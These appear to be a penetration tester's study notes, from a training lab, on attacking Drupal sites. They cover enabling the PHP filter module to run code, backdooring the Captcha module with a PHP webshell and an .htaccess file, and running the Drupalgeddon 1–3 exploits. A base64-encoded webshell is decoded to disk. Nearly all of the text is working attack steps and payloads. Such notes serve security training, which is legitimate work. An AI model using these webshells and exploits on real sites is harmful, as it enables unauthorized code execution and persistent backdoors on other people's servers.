#### Leveraging the PHP Filter Module

1. Enable PHP Filter Module
2. Create Basic Page
3. Add webshell to basic page
4. Set text format to PHP

After drupal 8 the php filter wont be installed natively so we need to add it ourselves

We can get the package and then upload it to modules
```shell-session
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Once downloaded go to `Administration` > `Reports` > `Available updates`.

#### Uploading backdoored modules

Get module
```shell-session
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```
extract module
```shell-session
tar xvf captcha-8.x-1.2.tar.gz
```
create webshell
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```
create .htaccess file
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
**Note:This is necessary as Drupal denies direct access to the /modules folder.

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.


#### Leveraging Known Vulnerabilities

[drupalgeddon](https://www.exploit-db.com/exploits/34992)

basic usage
```shell-session
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

[drupalgeddon2](https://www.exploit-db.com/exploits/44448)

create php webshell base64 encoded
```shell-session
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
basic usage
```shell-session
python3 drupalgeddon2.py 
```

[drupalgeddon3](https://cvedetails.com/cve/CVE-2018-7602/)

obtain valid session cookie from admin login with burp

use metasploit to run exploit
![[Pasted image 20250421011002.png]]
